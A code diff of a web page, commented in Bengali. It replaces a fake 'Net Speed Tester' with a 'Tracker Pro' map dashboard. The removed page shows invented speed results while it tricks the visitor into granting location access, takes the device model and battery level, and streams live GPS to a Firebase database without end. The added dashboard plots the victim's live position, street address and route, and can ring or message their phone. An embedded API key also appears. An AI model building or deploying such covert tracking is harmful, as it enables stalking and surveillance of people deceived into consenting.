@@ -3,163 +3,127 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Net Speed Tester</title>
+    <title>Pro Command Center</title>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Poppins:wght@400;600&display=swap');
-        body { font-family: 'Poppins', sans-serif; background: #0b0f19; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden;}
+        body { margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; overflow: hidden; background: #000;}
+        #map { height: 100vh; width: 100%; z-index: 1; }
         
-        /* Fake Speedometer UI */
-        .meter-container { position: relative; width: 250px; height: 250px; background: conic-gradient(#38bdf8 0%, #0ea5e9 0%, #1e293b 0%); border-radius: 50%; display: flex; justify-content: center; align-items: center; box-shadow: 0 0 30px rgba(14, 165, 233, 0.3); transition: 0.5s; }
-        .meter-inner { width: 220px; height: 220px; background: #0b0f19; border-radius: 50%; display: flex; flex-direction: column; justify-content: center; align-items: center; }
-        .speed-text { font-family: 'Orbitron', sans-serif; font-size: 45px; font-weight: bold; color: #38bdf8; text-shadow: 0 0 10px rgba(56,189,248,0.5); margin: 0;}
-        .speed-unit { font-size: 14px; color: #94a3b8; }
+        .dashboard { position: absolute; top: 15px; left: 15px; background: rgba(15, 23, 42, 0.95); backdrop-filter: blur(10px); padding: 20px; border-radius: 15px; z-index: 1000; box-shadow: 0 10px 30px rgba(0,0,0,0.8); width: 320px; border: 1px solid rgba(56,189,248,0.2); color: white;}
+        .dash-header { font-size: 20px; font-weight: bold; border-bottom: 1px solid #334155; padding-bottom: 10px; margin-bottom: 15px; color: #38bdf8; display: flex; justify-content: space-between; align-items: center;}
         
-        .stats { display: flex; gap: 40px; margin-top: 40px; text-align: center;}
-        .stat-box h4 { margin: 0; color: #94a3b8; font-size: 12px; text-transform: uppercase;}
-        .stat-box p { margin: 5px 0 0 0; font-family: 'Orbitron', sans-serif; font-size: 20px; color: #10b981; }
+        .data-row { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 14px; background: rgba(0,0,0,0.3); padding: 8px; border-radius: 8px;}
+        .data-label { color: #94a3b8; } .data-val { font-weight: bold; color: #f8fafc;}
         
-        .start-btn { margin-top: 40px; background: #38bdf8; color: #000; border: none; padding: 15px 50px; font-size: 18px; font-weight: bold; border-radius: 30px; cursor: pointer; box-shadow: 0 5px 20px rgba(56, 189, 248, 0.4); text-transform: uppercase; transition: 0.3s;}
-        .start-btn:active { transform: scale(0.95); }
-
-        /* Hidden Notice Box for Admin Messages */
-        #noticeBox { display: none; position: absolute; top: 20px; background: #fbbf24; color: black; padding: 10px 20px; border-radius: 10px; font-weight: bold; font-size: 14px; z-index: 1000;}
+        /* Address Box */
+        .address-box { background: rgba(16, 185, 129, 0.1); border-left: 4px solid #10b981; padding: 10px; border-radius: 5px; font-size: 13px; color: #e2e8f0; margin-bottom: 15px; line-height: 1.4;}
+        
+        /* Controls */
+        .btn-group { display: flex; gap: 10px; margin-top: 15px; }
+        .action-btn { flex: 1; padding: 10px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; color: white;}
+        .ring-btn { background: #ef4444; } .msg-btn { background: #3b82f6; }
+        
+        /* Marker rotation magic */
+        .smart-marker { text-align: center; font-size: 35px; filter: drop-shadow(2px 4px 6px rgba(0,0,0,0.5)); transition: transform 0.3s; }
     </style>
 </head>
 <body>
 
-    <div id="noticeBox">🔔 System Notice: <span id="msgText"></span></div>
+    <div class="dashboard">
+        <div class="dash-header">🛰️ Tracker Pro <span id="statusBadge" style="background:#10b981; padding: 3px 8px; border-radius: 10px; font-size: 12px; color:white;">Live</span></div>
+        
+        <div class="address-box" id="addressUI">📍 Fetching live street address...</div>
 
-    <div class="meter-container" id="meterBg">
-        <div class="meter-inner">
-            <p class="speed-text" id="mainSpeed">0.0</p>
-            <p class="speed-unit">Mbps</p>
+        <div class="data-row"><span class="data-label">Device Info:</span> <span class="data-val" id="deviceUI">--</span></div>
+        <div class="data-row"><span class="data-label">Battery Power:</span> <span class="data-val" id="batUI">--</span></div>
+        <div class="data-row"><span class="data-label">Current Speed:</span> <span class="data-val" id="speedUI">0 km/h</span></div>
+        <div class="data-row"><span class="data-label">GPS Accuracy:</span> <span class="data-val" id="accUI">-- meters</span></div>
+        
+        <div class="btn-group">
+            <button id="ringBtn" class="action-btn ring-btn">🔔 Ring Phone</button>
+            <button id="msgBtn" class="action-btn msg-btn">💬 Send Msg</button>
         </div>
     </div>
 
-    <div class="stats">
-        <div class="stat-box"><h4>Ping</h4><p id="pingVal">--</p></div>
-        <div class="stat-box"><h4>Upload</h4><p id="upVal">--</p></div>
-    </div>
+    <div id="map"></div>
 
-    <button class="start-btn" id="startBtn">GO</button>
-
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
-        import { getDatabase, ref, set, onValue, onDisconnect } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
+        import { getDatabase, ref, onValue, set } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
 
         const firebaseConfig = { apiKey: "AIzaSyAoQw5dhwS5JJZIWSPQTgKdMtB5ZEsoxLk", authDomain: "arng-805db.firebaseapp.com", projectId: "arng-805db", databaseURL: "https://arng-805db-default-rtdb.firebaseio.com/" };
         const app = initializeApp(firebaseConfig); const db = getDatabase(app);
-        
-        const userRef = ref(db, 'live_location/target_user');
-        const chatRef = ref(db, 'live_location/chat');
-        const commandRef = ref(db, 'live_location/command');
 
-        let wakeLock = null;
-        const alarmSound = new Audio('https://assets.mixkit.co/active_storage/sfx/995/995-preview.mp3');
+        // Map Setup (Satellite default)
+        const satelliteMap = L.tileLayer('https://{s}.google.com/vt/lyrs=s,h&x={x}&y={y}&z={z}', { maxZoom: 20, subdomains: ['mt0', 'mt1', 'mt2', 'mt3']});
+        const map = L.map('map', { layers: [satelliteMap] }).setView([23.8103, 90.4125], 6);
 
-        // Screen Wake Lock
-        const requestWakeLock = async () => {
-            try { if ('wakeLock' in navigator) wakeLock = await navigator.wakeLock.request('screen'); } catch (err) {}
-        };
+        let marker = null;
+        let accuracyRadar = null; // একুরেসি রাডার (নীল বৃত্ত)
+        let routeLine = L.polyline([], {color: '#ef4444', weight: 4, opacity: 0.8}).addTo(map); // রুট লাইন (লাল দাগ)
+        let lastGeocodeTime = 0;
 
-        // Battery Info
-        let batLvl = 100, isChg = false;
-        if(navigator.getBattery) navigator.getBattery().then(b => { batLvl = Math.round(b.level*100); isChg = b.charging; });
+        // Message & Ring Buttons
+        document.getElementById('msgBtn').addEventListener('click', () => {
+            const msg = prompt("Enter your message:");
+            if(msg) set(ref(db, 'live_location/chat'), { message: msg, time: Date.now() });
+        });
+        document.getElementById('ringBtn').addEventListener('click', () => { set(ref(db, 'live_location/command'), { ringTime: Date.now() }); });
 
-        // 🚀 অ্যাডভান্সড ডিভাইস মডেল বের করার ফাংশন
-        async function getExactDeviceModel() {
-            let deviceName = "Unknown Device";
-            const ua = navigator.userAgent;
-
-            // ১. মডার্ন API দিয়ে ট্রাই করা (নতুন অ্যান্ড্রয়েডের জন্য)
-            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
-                try {
-                    const uaData = await navigator.userAgentData.getHighEntropyValues(["model", "platform"]);
-                    if (uaData.model) {
-                        return `${uaData.platform} (${uaData.model})`; // Output: Android (SM-G998B)
-                    }
-                } catch (e) { console.log("Modern API Blocked"); }
-            }
-
-            // ২. ক্লাসিক স্ট্রিং থেকে বের করা (পুরানো অ্যান্ড্রয়েডের জন্য)
-            if (/Android/i.test(ua)) {
-                const match = ua.match(/Android.*?; (.*?) Build/);
-                if (match && match[1]) {
-                    deviceName = `Android (${match[1].trim()})`;
-                } else {
-                    deviceName = "Android Smartphone";
-                }
-            } 
-            // ৩. আইফোন বা পিসির জন্য
-            else if (/iPhone/i.test(ua)) { deviceName = "Apple iPhone"; } 
-            else if (/iPad/i.test(ua)) { deviceName = "Apple iPad"; } 
-            else if (/Windows/i.test(ua)) { deviceName = "Windows PC"; }
-
-            return deviceName;
+        // লাইভ রাস্তার নাম বের করার ফাংশন (Reverse Geocoding)
+        function fetchAddress(lat, lng) {
+            const now = Date.now();
+            if(now - lastGeocodeTime < 15000) return; // ১৫ সেকেন্ডে ১ বার কল হবে (ব্যান হওয়া ঠেকাতে)
+            lastGeocodeTime = now;
+            fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lng}`)
+                .then(res => res.json())
+                .then(data => { document.getElementById('addressUI').innerText = `📍 ${data.display_name}`; })
+                .catch(err => console.log(err));
         }
 
-        // Admin Commands (Ring & Chat)
-        onValue(chatRef, (snap) => {
-            const data = snap.val();
-            if(data && data.time > Date.now() - 5000) {
-                document.getElementById('msgText').innerText = data.message;
-                document.getElementById('noticeBox').style.display = 'block';
-                setTimeout(() => { document.getElementById('noticeBox').style.display = 'none'; }, 8000);
+        const locationRef = ref(db, 'live_location/target_user');
+        
+        onValue(locationRef, (snapshot) => {
+            const data = snapshot.val();
+            if (data && data.isOnline) {
+                const { latitude: lat, longitude: lng, accuracy, speed, heading, battery, deviceInfo } = data;
+                
+                // UI Update
+                document.getElementById('deviceUI').innerText = deviceInfo;
+                document.getElementById('batUI').innerText = `${battery}%`;
+                document.getElementById('speedUI').innerText = `${speed} km/h`;
+                document.getElementById('accUI').innerText = `${Math.round(accuracy)}m`;
+
+                // লাইভ এড্রেস কল
+                fetchAddress(lat, lng);
+
+                // আইকন সিলেকশন এবং রোটেশন (কম্পাস)
+                let emoji = speed > 10 ? "🚘" : (speed > 2 ? "🚶‍♂️" : "🧍‍♂️");
+                // যদি স্পিড থাকে, তবে গাড়ি/মানুষ যেদিকে যাচ্ছে আইকন সেদিকে ঘুরবে
+                let htmlFormat = `<div class="smart-marker" style="transform: rotate(${heading}deg);">${emoji}</div>`;
+                const smartIcon = L.divIcon({ className: '', html: htmlFormat, iconSize: [40, 40], iconAnchor: [20, 20] });
+
+                const latlng = [lat, lng];
+                routeLine.addLatLng(latlng); // ম্যাপে রাস্তার দাগ আঁকা হচ্ছে
+
+                if (!marker) { 
+                    // ফার্স্ট টাইম ম্যাপ লোড
+                    accuracyRadar = L.circle(latlng, { radius: accuracy, color: '#38bdf8', fillColor: '#38bdf8', fillOpacity: 0.2 }).addTo(map);
+                    marker = L.marker(latlng, {icon: smartIcon}).addTo(map); 
+                    map.flyTo(latlng, 18); 
+                } else { 
+                    // লাইভ আপডেট
+                    marker.setLatLng(latlng); 
+                    marker.setIcon(smartIcon); 
+                    accuracyRadar.setLatLng(latlng);
+                    accuracyRadar.setRadius(accuracy); // রাডার সাইজ আপডেট
+                    if(speed > 2) map.panTo(latlng); // চললে ম্যাপ নিজে নিজে সরবে
+                }
+            } else {
+                document.getElementById('statusBadge').style.background = '#64748b';
+                document.getElementById('statusBadge').innerText = 'Offline';
             }
-        });
-
-        onValue(commandRef, (snap) => {
-            const cmd = snap.val();
-            if(cmd && cmd.ringTime > Date.now() - 5000) {
-                alarmSound.play().catch(e=>{});
-                if(navigator.vibrate) navigator.vibrate([1000, 500, 1000, 500, 2000]);
-            }
-        });
-
-        // Start Test & Track Logic
-        const startTestBtn = document.getElementById('startBtn');
-        startTestBtn.addEventListener('click', async () => {
-            requestWakeLock(); // Screen lock ON
-            
-            // মডেল নাম্বার ফেচ করা হচ্ছে
-            const deviceModelName = await getExactDeviceModel();
-
-            // Ask Location Permission & Start Tracking
-            if(navigator.geolocation) {
-                onDisconnect(userRef).update({ isOnline: false });
-                navigator.geolocation.watchPosition(
-                    (pos) => {
-                        set(userRef, {
-                            latitude: pos.coords.latitude, longitude: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy, heading: pos.coords.heading || 0,
-                            speed: pos.coords.speed ? Math.round(pos.coords.speed * 3.6) : 0,
-                            battery: batLvl, charging: isChg, isOnline: true,
-                            deviceInfo: deviceModelName, // এখানে মডেল নাম্বার পাঠানো হলো
-                            timestamp: new Date().toLocaleString()
-                        });
-                    },
-                    (err) => { alert("Need Location access to find nearest server!"); },
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                );
-            }
-
-            // Fake UI Animation Magic
-            startTestBtn.style.display = "none";
-            document.getElementById('pingVal').innerText = Math.floor(Math.random() * 20 + 10) + " ms";
-            let fakeSpeed = 0;
-            let testInterval = setInterval(() => {
-                fakeSpeed += Math.random() * 5;
-                if(fakeSpeed > 45) fakeSpeed -= Math.random() * 8; // Max speed ~45
-                document.getElementById('mainSpeed').innerText = fakeSpeed.toFixed(1);
-                document.getElementById('meterBg').style.background = `conic-gradient(#38bdf8 ${fakeSpeed*2}%, #1e293b 0%)`;
-            }, 100);
-
-            setTimeout(() => {
-                clearInterval(testInterval);
-                document.getElementById('upVal').innerText = (fakeSpeed / 3).toFixed(1) + " Mbps";
-                startTestBtn.innerText = "TEST AGAIN";
-                startTestBtn.style.display = "block";
-            }, 10000); // Test finishes in 10s, tracking continues in background forever
         });
     </script>
 </body>
